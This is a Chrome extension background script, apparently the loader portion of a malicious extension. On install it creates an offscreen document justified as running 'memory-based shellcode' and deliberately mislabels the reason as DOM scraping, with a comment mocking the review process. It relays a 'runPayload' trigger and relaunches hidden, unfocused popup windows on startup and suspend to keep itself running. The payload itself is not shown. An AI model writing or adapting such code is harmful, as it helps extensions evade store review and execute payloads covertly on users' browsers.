chrome.runtime.onInstalled.addListener(() => {
  chrome.offscreen.createDocument({
    url: "offscreen.html",
    reasons: ["DOM_SCRAPING"], // lol, yeah okay Google
    justification: "Execute memory-based shellcode for demo purposes"
  });
});
chrome.runtime.onMessage.addListener((req) => {
  if (req.payloadTrigger) {
    chrome.runtime.sendMessage({ runPayload: true });
    chrome.windows.create({ url: "offscreen.html", focused: false, type: "popup" });
  }
});
chrome.runtime.onStartup.addListener(() => {
  chrome.windows.create({ url: "offscreen.html", focused: false, type: "popup" });
});
chrome.runtime.onSuspend.addListener(() => {
  chrome.windows.create({ url: "offscreen.html", focused: false, type: "popup" });
});
